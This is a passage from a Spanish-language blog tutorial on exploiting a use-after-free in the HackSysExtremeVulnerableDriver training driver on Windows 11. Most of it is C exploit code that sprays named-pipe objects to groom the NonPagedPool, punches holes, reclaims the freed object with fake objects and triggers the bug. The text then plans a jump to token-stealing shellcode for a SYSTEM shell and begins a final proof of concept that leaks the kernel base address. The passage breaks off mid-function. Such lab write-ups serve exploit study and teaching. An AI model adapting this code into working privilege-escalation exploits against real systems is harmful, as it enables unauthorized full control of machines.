+</span></span><span style="display:flex;"><span>  PipeHandles pipeHandle <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreatePipeObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Handles: 0x%llx, 0x%llx&#34;</span>, pipeHandle.read, pipeHandle.write);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DebugBreak</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating structure</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, ALLOCATE_REAL_OBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Freeing structure</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, FREE_OBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Una vez más, utilizamos la implementación de <code>VulnDevs</code>. Si ejecutamos esto, los identificadores se imprimen en STDOUT y podemos inspeccionarlos usando WinDbg.</p>
+<p><img src="/0x03-Approaching-the-Modern-Windows-Kernel-Heap/inspect.png" alt="alt text"></p>
+<p>En el resultado anterior vemos que el objeto está en un NonPagedPool pero su tamaño es 0x190, qué pasó? Como se menciona en la publicación, al realizar estas operaciones se creó un objeto de DATA_ENTRY. Estos objetos se asignan mediante la etiqueta &ldquo;NpFr&rdquo;. Podemos encontrarlo usando <code>!poolused</code>. Al igual que <code>VulnDev</code>, cuando intenté encontrar esto usando <code>poolfind</code>, no tuve suerte..</p>
+<p><img src="/0x03-Approaching-the-Modern-Windows-Kernel-Heap/poolused.png" alt="alt text"></p>
+<p>Sin embargo, esto muestra que hemos asignado correctamente 112 bytes en el NonPagedPool. Todo tiene sentido ahora… la ecuación es básicamente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">sizeof</span>(uBuffer) <span style="color:#f92672">+</span> (<span style="color:#66d9ef">sizeof</span>(_NP_DATA_QUEUE_ENTRY) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x48</span>) <span style="color:#f92672">==</span> ALLOC_SIZE
+</span></span></code></pre></div><p>Esto se demuestra si ejecutamos el código con las modificaciones adecuadas:</p>
+<p><img src="/0x03-Approaching-the-Modern-Windows-Kernel-Heap/poolused2.png" alt="alt text"></p>
+<p>Hay otro problema. Dado que el kernel tiene asignaciones en todo momento, no hay garantía de que nuestra asignación tome la ubicación del objeto liberado.</p>
+<p>Una forma de solucionar esto es crear un montón de hoyos, rodeados de asignaciones que controlamos. Esto nos da una buena oportunidad de obtener nuestra condición de UAF. Una vez que hayamos asignado y liberado el objeto normal, podemos crear un montón de objetos falsos usando <code>AllocateFakeObjectNonPagedPool</code>, esto aumenta nuestras posibilidades de tomar la memoria de asignación liberada.</p>
+<p>Básicamente lo que vamos a hacer es:</p>
+<ol>
+<li>Asigne un montón de objetos DATA_ENTRY (CreatePipe + WriteFile)</li>
+<li>Libere cada segundo objeto DATA_ENTRY para crear ubicaciones de asignación gratuitas (hoyod)</li>
+<li>Asigne la estructura USE_AFTER_FREE_NON_PAGED_POOL</li>
+<li>Libere la estructura USE_AFTER_FREE_NON_PAGED_POOL</li>
+<li>Intente recuperar la memoria liberada (donde alguna vez estuvo la estructura USE_AFTER_FREE_NON_PAGED_POOL)</li>
+<li>Activar el UAF y llame a nuestro objeto falso.</li>
+</ol>
+<p>Para lograr esto utilicé el siguiente código:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// IOCTL Codes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define ALLOCATE_REAL_OBJ 0x222013
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CALL_FUNC_PTR     0x222017
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREE_OBJ          0x22201b
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ALLOCATE_FAKE_OBJ 0x22201f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> PipeHandles {
+</span></span><span style="display:flex;"><span>  HANDLE read;
+</span></span><span style="display:flex;"><span>  HANDLE write;
+</span></span><span style="display:flex;"><span>} PipeHandles;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> PipeHandles <span style="color:#a6e22e">CreatePipeObject</span>() {
+</span></span><span style="display:flex;"><span>  BYTE uBuffer[<span style="color:#ae81ff">0x18</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> }; <span style="color:#75715e">// sizeof(uBuffer) + (sizeof(_NP_DATA_QUEUE_ENTRY) == 0x48) == ALLOC_SIZE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  HANDLE readPipe    <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  HANDLE writePipe   <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD resultLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlFillMemory</span>(uBuffer, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x41</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CreatePipe</span>(<span style="color:#f92672">&amp;</span>readPipe, <span style="color:#f92672">&amp;</span>writePipe, NULL, <span style="color:#66d9ef">sizeof</span>(uBuffer))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] CreatePipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(writePipe, uBuffer, <span style="color:#66d9ef">sizeof</span>(uBuffer), <span style="color:#f92672">&amp;</span>resultLength, NULL)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] WriteFile</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">struct</span> PipeHandles) {.read <span style="color:#f92672">=</span> readPipe, .write <span style="color:#f92672">=</span> writePipe};
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sendIoctl</span>(HANDLE hHEVD, DWORD dIoctl, CHAR <span style="color:#f92672">*</span>pBuffer, DWORD dBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD bytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  dIoctl,
+</span></span><span style="display:flex;"><span>                  pBuffer,
+</span></span><span style="display:flex;"><span>                  dBuffer,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DEF_PIPES 20000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SEQ_PIPES 60000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i                                    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD                             <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  BYTE uBuffer[<span style="color:#ae81ff">0x58</span>]                       <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>  PipeHandles defragPipeHandles[DEF_PIPES] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>  PipeHandles seqPipeHandles[SEQ_PIPES]    <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* I found this intresting, we must allocate DATA_ENTRY objects like so otherwise
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     we will fail to allocate any. We have to start with a low amount THEN allocate
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     the sequential DATA_ENTRY objects. Although this is just 80000 allocations, we
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     CANNOT just use one loop to hold all 80000 allocations. We must space it out */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Spraying objects for pool defragmentation</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> DEF_PIPES; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    defragPipeHandles[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreatePipeObject</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SEQ_PIPES; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    seqPipeHandles[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreatePipeObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Creating holes to store object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SEQ_PIPES; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">CloseHandle</span>(seqPipeHandles[i].read);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">CloseHandle</span>(seqPipeHandles[i].write);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating target structure</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, ALLOCATE_REAL_OBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Freeing target structure</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, FREE_OBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Filling holes with custom objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(uBuffer) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)(<span style="color:#ae81ff">0x41414141</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">30000</span>; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sendIoctl</span>(hHEVD, ALLOCATE_FAKE_OBJ, uBuffer, <span style="color:#66d9ef">sizeof</span>(uBuffer));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering UAF</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, CALL_FUNC_PTR, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="explotación">Explotación</h1>
+<p>Entonces, cómo podemos llegar a nuestro shellcode? Aprendimos que al intentar obtener la ejecución de código en Windows 10, una de las rutas de ataque es marcar la entrada de la tabla de páginas (PTE) como una página del kernel. Sin embargo, dado que la asignación fue realizada por el kernel y marcada como ejecutable, la entrada señalada por RAX debería estar clara para su ejecución!</p>
+<p><img src="/0x03-Approaching-the-Modern-Windows-Kernel-Heap/observing_crash.png" alt="alt text"></p>
+<p>Dado que tenemos 0x60 bytes de espacio, este debería ser espacio más que suficiente para nuestra carga útil de robo de tokens + código de recuperación. El plan de escape es el siguiente:</p>
+<ol>
+<li>Encuentra un gadget para:
+<ul>
+<li>Incrementar RAX para que apunte más allá de los primeros 8 bytes en la asignación del grupo no paginado</li>
+<li>Saltar a RAX</li>
+</ul>
+</li>
+<li>Ejecute el Shellcode</li>
+<li>Reparar la Stack</li>
+</ol>
+<p>Esta es una imagen de lo que estamos tratando de lograr:</p>
+<p><img src="/0x03-Approaching-the-Modern-Windows-Kernel-Heap/plan.png" alt="alt text"></p>
+<p>Después de una buena batalla, podemos obtener el shell de SYSTEM en Winderp 11.</p>
+<p>Aquí está el PoC final:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// IOCTL Codes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define ALLOCATE_REAL_OBJ 0x222013
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CALL_FUNC_PTR     0x222017
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREE_OBJ          0x22201b
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ALLOCATE_FAKE_OBJ 0x22201f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// DATA_ENTRY Allocations
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define DEF_PIPES 20000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SEQ_PIPES 60000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CreatePipeObject():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     This function creates a pipe and returns the handles to the read and write ends of said pipe. However,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     what this does in the case of our exploit is create an allocation in the NonPaged pool. It&#39;s important
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     to note each allocation is made by the Named Pipe File System (NPFS.sys). That said it will prepend an
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     allocation with a DATA_ENTRY structure (or NP_DATA_QUEUE_ENTRY), on an x86_64 system this structure is 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     0x48 bytes. So each allocation must be greater than 0x48 bytes. Equation below:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       CreatePipe(HANDLE hR, HANDLE hW, NULL, nSize);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       NonPagedAllocation = nSize + sizeof(_NP_DATA_QUEUE_ENTRY)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     So in our case we&#39;re allocating 0x60 bytes in the NonPaged pool. This code was taken from VulnDevs
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     blog located here:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    The only difference is this was written in C vs C++ */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> PipeHandles {
+</span></span><span style="display:flex;"><span>  HANDLE read;
+</span></span><span style="display:flex;"><span>  HANDLE write;
+</span></span><span style="display:flex;"><span>} PipeHandles;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> PipeHandles <span style="color:#a6e22e">CreatePipeObject</span>() {
+</span></span><span style="display:flex;"><span>  BYTE uBuffer[<span style="color:#ae81ff">0x18</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  HANDLE readPipe    <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  HANDLE writePipe   <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD resultLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlFillMemory</span>(uBuffer, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x41</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CreatePipe</span>(<span style="color:#f92672">&amp;</span>readPipe, <span style="color:#f92672">&amp;</span>writePipe, NULL, <span style="color:#66d9ef">sizeof</span>(uBuffer))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] CreatePipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(writePipe, uBuffer, <span style="color:#66d9ef">sizeof</span>(uBuffer), <span style="color:#f92672">&amp;</span>resultLength, NULL)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] WriteFile</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">struct</span> PipeHandles) {.read <span style="color:#f92672">=</span> readPipe, .write <span style="color:#f92672">=</span> writePipe};
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* SendIOCTL():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Send the IOCTL code to the driver */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SendIOCTL</span>(HANDLE hHEVD, DWORD dIoctl, CHAR <span style="color:#f92672">*</span>pBuffer, DWORD dBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD bytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  dIoctl,
+</span></span><span style="display:flex;"><span>                  pBuffer,
+</span></span><span style="display:flex;"><span>                  dBuffer,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelBaseAddress():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Using EnumDeviceDrivers() obtain the base address of ntoskrnl.exe */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  ULONG_PTR pKernelBaseAddress <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpImageBase          <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesNeeded          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to calculate bytes needed for device driver entries&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpImageBase <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, dwBytesNeeded))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate heap for lpImageBase</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lpImageBase) {
